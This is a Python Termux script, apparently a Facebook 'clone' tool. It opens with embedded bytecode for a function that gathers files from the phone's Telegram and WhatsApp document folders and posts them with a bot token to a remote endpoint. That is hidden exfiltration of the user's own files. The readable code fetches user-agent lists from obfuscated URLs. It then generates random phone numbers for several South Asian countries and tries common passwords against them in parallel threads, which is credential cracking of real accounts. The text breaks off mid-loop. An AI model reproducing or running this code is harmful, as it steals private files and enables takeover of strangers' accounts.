r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>1\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z\x1f/sdcard/Telegram/Telegram Filesc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>>\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00z)/sdcard/WhatsApp/Media/WhatsApp Documentsc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x18sexy.<locals>.<listcomp>K\x00\x00\x00r\x15\x00\x00\x00r\t\x00\x00\x00)\x08r\x05\x00\x00\x00r\x06\x00\x00\x00\xda\x02os\xda\x07listdir\xda\x04open\xda\x04path\xda\x04join\xda\x04post\xa9\rr\x06\x00\x00\x00\xda\tbot_tokenr\x19\x00\x00\x00\xda\x0bsdcard_path\xda\tfile_list\xda\x04filer\x13\x00\x00\x00\xda\x03url\xda\x05data2r\x1c\x00\x00\x00r\x1d\x00\x00\x00\xda\x03get\xda\x04sents\r\x00\x00\x00             r\x07\x00\x00\x00\xda\x04sexyr1\x00\x00\x00\x0f\x00\x00\x00s\xef\x05\x00\x00\x80\x00\xdd\x0c\x14\xd4\x0c\x1c\xd1\x0c\x1e\xd4\x0c\x1e\x80G\xd8\x0f?\x80I\xd8\r\x19\x80G\xf0\x04\x0c\x05\x10\xe0\x16\x1f\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x16(\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x161\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x167\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0b\x05\x10\xd8\x16A\x88\x0b\xd8\x14M\xd0\x14M\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14M\xd1\x14M\xd4\x14M\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf0\x00\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\x884\xf8\xf8\xf8s\xf9\x00\x00\x00\x99A\x12C\x07\x00\xc1+A\x03B:\x05\xc2.\x0cC\x07\x00\xc2:\x04B>\t\xc2>\x03C\x07\x00\xc3\x01\x01B>\t\xc3\x02\x04C\x07\x00\xc3\x07\x02C\x0b\x03\xc3\x0fA\x12E=\x00\xc4!A\x03E0\x05\xc5$\x0cE=\x00\xc50\x04E4\t\xc54\x03E=\x00\xc57\x01E4\t\xc58\x04E=\x00\xc5=\x02F\x01\x03\xc6\x05A\x12H3\x00\xc7\x17A\x03H&\x05\xc8\x1a\x0cH3\x00\xc8&\x04H*\t\xc8*\x03H3\x00\xc8-\x01H*\t\xc8.\x04H3\x00\xc83\x02H7\x03\xc8;A\x12K)\x00\xca\rA\x03K\x1c\x05\xcb\x10\x0cK)\x00\xcb\x1c\x04K \t\xcb \x03K)\x00\xcb#\x01K \t\xcb$\x04K)\x00\xcb)\x02K-\x03\xcb1A\x12N \x00\xcd\x03A\x03N\x12\x05\xce\x06\x0cN \x00\xce\x12\x04N\x16\t\xce\x16\x03N \x00\xce\x19\x01N\x16\t\xce\x1a\x04N \x00\xce \x02N%\x03c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3*\x06\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x01}\x01d\x02}\x02\t\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x06}\x03d\x07\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x06}\x03d\x0e\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\
#▬▭▬▭▬▭▬▭[KEY GENERATOR]▬▭▬▭▬▭▬▭#
def key():
    model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').strip()
    mod = base64.b64encode(model.encode()).decode().replace('b', '')
    uID = hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + mod).replace(' ', '').encode()).hexdigest()
    return uID.upper()
mr_key = key()
try:open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/MR-TAREK.txt', 'w').write(mr_key)
except:pass
#▬▭▬▭▬▭▬▭[ FILE_M1_UA]▬▭▬▭▬▭▬▭#
try:F1 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1w\xf3\xf4q\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd4+\xa9(\x01\x00\xa5\xed\x18\xc9'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
FM1 = F1.strip()
#▬▭▬▭▬▭▬▭[ FILE_M2_UA]▬▭▬▭▬▭▬▭#
try:F2 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1w\xf3\xf4q\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd2+\xa9(\x01\x00\xa5\xf2\x18\xca'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
FM2 = F2.strip()
#▬▭▬▭▬▭▬▭[ FILE_M3_UA]▬▭▬▭▬▭▬▭#
try:F3 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1w\xf3\xf4q\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd6+\xa9(\x01\x00\xa5\xf7\x18\xcb'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
FM3 = F3.strip()
#▬▭▬▭▬▭▬▭[ FILE_M4_UA]▬▭▬▭▬▭▬▭#
try:F4 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1w\xf3\xf4q\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd1+\xa9(\x01\x00\xa5\xfc\x18\xcc'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
FM4 = F4.strip()
#▬▭▬▭▬▭▬▭[ FILE_M5_UA]▬▭▬▭▬▭▬▭#
try:F5 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1w\xf3\xf4q\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd5+\xa9(\x01\x00\xa6\x01\x18\xcd'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
FM5 = F5.strip()
#▬▭▬▭▬▭▬▭[ FILE_M6_UA]▬▭▬▭▬▭▬▭#
try:F6 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1w\xf3\xf4q\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd3+\xa9(\x01\x00\xa6\x06\x18\xce'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
FM6 = F6.strip()
#▬▭▬▭▬▭▬▭[RANDOM_M1_UA]▬▭▬▭▬▭▬▭#
try:R1 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1\x0fr\xf4s\xf1\xf7\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd4+\xa9(\x01\x00\xd7e\x19j'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
RM1 = R1.strip()
#▬▭▬▭▬▭▬▭[RANDOM_M2_UA]▬▭▬▭▬▭▬▭#
try:R2 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1\x0fr\xf4s\xf1\xf7\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd2+\xa9(\x01\x00\xd7j\x19k'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
RM2 = R2.strip()
#▬▭▬▭▬▭▬▭[RANDOM_M3_UA]▬▭▬▭▬▭▬▭#
try:R3 = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\xd1\x0fr\xf4s\xf1\xf7\xd5\xf5u\r\xf1\xf0w\xd1\xcfM\xcc\xcc\xd3\xf7M-\xc9\xc8Oq\xd6+\xa9(\x01\x00\xd7o\x19l'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
RM3 = R3.strip()
#▬▭▬▭▬▭▬▭[TOOL VERSION]▬▭▬▭▬▭▬▭#
try:
    version = py_curl(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\xf7\r\xd2\rq\x0cr\xf5\xd6510\xd1w\xf6\xf7\x0b\t\xf2\xf7\xd1\r\xf2\xf7\xf7\xd5\xcfM\xcc\xcc\xd3\x0fK-*\xce\xcc\xcf\xd3+\xa9(\x01\x00\x0c\x85\x1aV'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
version = version.strip()
#▬▭▬▭▬▭▬▭[ MY_LOGO]▬▭▬▭▬▭▬▭#
logo=(Colorate.Horizontal(Colors.green_to_white, """_  _  ____      ___   ____   ____   ____   _  _
|\/|  |__/  __   |    |__|   |__/   |___   |_/
|  |  |  \       |    |  |   |  \   |___   | \_"""))
info=(f"""{style}{green} FACEBOOK {red}» {white}MD TAREK HOSSEN
{style}{green} STATUS   {red}» {faltu}{rad}FILE{pvt}{green}{green1}┼{faltu}{rad}RANDOM{pvt}{green}
{style} {green}VERSION  {red}» {white}PERSONAL
{style}{green} GITHUB   {red}» {white}github.com/MR-TAREK-404""")
def main_logo():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(logo);linex();print(info);linex()
#▬▭▬▭▬▭▬▭[MAIN MENU]▬▭▬▭▬▭▬▭#
def tarek_main():
    main_logo()
    #animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    #for i in range(30):
        #time.sleep(0.1)
        #sys.stdout.write(f"\r{style} {green}LOADING...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
        #sys.stdout.flush()
    main_logo()
    print(f'{white}[{red}A{white}] {green}START RANDOM CLONE')
    print(f'{white}[{red}B{white}] {green}START FILE CLONE')
    print(f'{white}[{red}B{white}] {green}CONTACT TOOL ADMIN')
    print(f'{white}[{red}O{white}] {green}EXIT THIS TERMINAL');linex()
    menu_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if menu_select in ['A','a','01','1']:os.system("xdg-open https://www.facebook.com/Mr.tarek.termux.community");_random_password()
    elif menu_select in ['B','b','02','2']:os.system("xdg-open https://www.facebook.com/Mr.tarek.termux.community");__FILEX__()
    elif menu_select in ['C','c','03','3']:os.system("xdg-open https://www.facebook.com/profile.php?id=100085495162407")
    elif menu_select in ['O','o','00','0']:os.system("xdg-open https://www.facebook.com/Mr.tarek.termux.community");os.system("exit")
    else:print(f'SELECTED OPTION NOT FOUND');tarek_main()
#▬▭▬▭▬▭▬▭[RANDOM PASSWORD]▬▭▬▭▬▭▬▭#
def _random_password():
    main_logo()
    print(f'{white}[{red}A{white}]{green} AUTO PASSWORD')
    print(f'{white}[{red}B{white}]{green} CUSTOM PASSWORD')
    linex()
    random_pass = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if random_pass in ['A','a','01','1']:_random_()
    elif random_pass in ['B','b','02','2']:_random_choice()
    else:_random_()
#▬▭▬▭▬▭▬▭[RANDOM MENU AUTO]▬▭▬▭▬▭▬▭#
def _random_():
    main_logo()
    print(f'{white}[{red}A{white}]{green} BD RANDOM V1 ')
    print(f'{white}[{red}B{white}]{green} BD RANDOM V2')
    print(f'{white}[{red}C{white}]{green} INDIA RANDOM')
    print(f'{white}[{red}D{white}]{green} PAKISTAN RANDOM')
    print(f'{white}[{red}E{white}]{green} NEPAL RANDOM')
    linex()
    random_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if random_select in ['A','a','01','1']:_bangladesh_()
    elif random_select in ['B','b','02','2']:_bangladesh2_()
    elif random_select in ['C','c','03','3']:_india_()
    elif random_select in ['D','d','04','4']:_pakistan_()
    elif random_select in ['E','e','05','5']:_nepal_()
    else:_random_()
#▬▭▬▭▬▭▬▭[RANDOM MENU CHOICE]▬▭▬▭▬▭▬▭#
def _random_choice():
    main_logo()
    print(f'{white}[{red}A{white}]{green} BD RANDOM V1 ')
    print(f'{white}[{red}B{white}]{green} BD RANDOM V2')
    print(f'{white}[{red}C{white}]{green} INDIA RANDOM')
    print(f'{white}[{red}D{white}]{green} PAKISTAN RANDOM')
    print(f'{white}[{red}E{white}]{green} NEPAL RANDOM')
    linex()
    random_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if random_select in ['A','a','01','1']:_bangladesh_choice()
    elif random_select in ['B','b','02','2']:_bangladesh2_choice()
    elif random_select in ['C','c','03','3']:_india_choice()
    elif random_select in ['D','d','04','4']:_pakistan_choice()
    elif random_select in ['E','e','05','5']:_nepal_choice()
    else:_random_choice()
#▬▭▬▭▬▭▬▭[BD RANDOM 1]▬▭▬▭▬▭▬▭#
def _bangladesh_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green} 017 019 018 016 013');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    plist = []
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_tarek_404:
        main_logo()
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','@@@@@@']
            if random_method in ['A','a','01','1']:mr_tarek_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_tarek_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_tarek_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_tarek_404.submit(_method_four, ids, passlist,tl)
